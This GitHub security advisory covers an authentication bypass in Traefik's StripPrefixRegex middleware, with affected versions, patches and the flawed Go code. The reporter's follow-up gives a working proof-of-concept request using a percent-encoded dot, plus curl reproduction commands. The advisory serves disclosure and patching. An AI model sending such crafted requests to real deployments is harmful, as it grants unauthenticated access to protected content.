# [H] Traefik has an StripPrefixRegex Middleware Authorization Bypass via Path/RawPath Desync

## Summary
Severity: High
Advisory: GHSA-6jwx-7vp4-9847
CVE: CVE-2026-40912
CWE: CWE-22, CWE-706
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-6jwx-7vp4-9847
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-ea.1 <3.7.0-rc.2
- Go: `github.com/traefik/traefik/v3` — affected >=3.0.0-beta1 <3.6.14
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.43
- Go: `github.com/traefik/traefik` — affected >=0

## Details
## Summary

There is a high severity authentication bypass vulnerability in Traefik's `StripPrefixRegex` middleware when used in combination with `ForwardAuth`, `BasicAuth`, or `DigestAuth`.

The middleware matches the regex against the decoded URL path but uses the resulting byte length to slice the percent-encoded raw path. When a dot (or multiple dots) appears in the prefix portion of the URL, the raw path after stripping becomes a dot-segment (e.g. `/./admin/secret`).

`ForwardAuth` receives this dot-segment path in `X-Forwarded-Uri`, which does not match the protected path patterns and therefore allows the request through. The backend then normalizes the dot-segment to the real path per RFC 3986 and serves the protected content

 An unauthenticated attacker can exploit this against any backend that performs dot-segment normalization.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.43
- https://github.com/traefik/traefik/releases/tag/v3.6.14
- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.2

## For more information

If there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

### Summary

  StripPrefixRegex uses the byte length of a decoded Path match to slice the encoded RawPath. When percent-encoded characters are in the prefix region, this produces a wrong RawPath. ForwardAuth then
  receives this wrong path in X-Forwarded-Uri, sees a path that doesn't match its protection rules, and approves the request. The backend serves protected content.

 ### Details

  `pkg/middlewares/stripprefixregex/strip_prefix_regex.go`, line 62:

  ```go
  req.URL.RawPath = ensureLeadingSlash(req.URL.RawPath[len(prefix):])
```

  prefix comes from matching the regex against the decoded req.URL.Path (line 51). len(prefix) is then used to index into the encoded req.URL.RawPath. These lengths don't match when percent-encoding is
  present.

  Example with regex ^/api:

  - GET /api%20/admin/secret
  - Decoded Path: /api /admin/secret -> prefix = /api (4 bytes)
  - Encoded RawPath: /api%20/admin/secret -> same region is 6 bytes
  - RawPath[4:] = %20/admin/secret -> after ensureLeadingSlash -> /%20/admin/secret
  - ForwardAuth sees X-Forwarded-Uri: /%20/admin/secret -> not /admin/* -> allows it
  - Backend serves the protected admin content

  PoC

  Requires Docker and Docker Compose. I have a setup that runs Traefik v3.6.11 with StripPrefixRegex + ForwardAuth + a backend. It sends a normal request (blocked, 403) and an encoded request (bypasses
  auth, 200, returns protected data). Can share the files here if useful.

  Impact

  Auth bypass. Any path protected by ForwardAuth, BasicAuth, or DigestAuth can be accessed without credentials when StripPrefixRegex is in the same middleware chain. The attacker only needs to add a
  percent-encoded character to the prefix portion of the URL.

---

### Updated PoC (reporter follow-up)

After further testing, the confirmed working exploit uses `%2e` (percent-encoded dot) rather than `%20`. Dot-segment normalization (`/./` -> `/`) is RFC 3986 standard behavior handled automatically by Express.js, Go's `http.ServeMux`, Spring Boot, and others — no custom configuration needed.

Chain:

```
GET /api%2e/admin/secret
-> StripPrefixRegex strips /api -> RawPath becomes /./admin/secret
-> ForwardAuth sees /./admin/secret -> does not match /admin/ -> allows
-> Express normalizes /./admin/secret -> /admin/secret -> serves protected content
```

Results (Traefik v3.6, unmodified Express.js express.static):

```
GET /api/admin/secret      -> 403 (blocked)
GET /api%2e/admin/secret   -> 200 (bypass — served protected content)
GET /api%20/admin/secret   -> 404 (space not normalized by backend)
```

Auth server logs:

```
X-Forwarded-Uri: '/admin/secret'    -> DENIED
X-Forwarded-Uri: '/./admin/secret'  -> ALLOWED
```

Reproduction:

```bash
docker compose up -d --build --wait
curl http://localhost:8080/api/admin/secret                       # -> 403
curl --path-as-is "http://localhost:8080/api%2e/admin/secret"     # -> 200
```

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-6jwx-7vp4-9847
- https://nvd.nist.gov/vuln/detail/CVE-2026-40912
- https://access.redhat.com/errata/RHSA-2026:21772
- https://access.redhat.com/security/cve/CVE-2026-40912
- https://bugzilla.redhat.com/show_bug.cgi?id=2464229
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.43
- https://github.com/traefik/traefik/releases/tag/v3.6.14
- https://github.com/traefik/traefik/releases/tag/v3.7.0-rc.2
- https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-40912.json
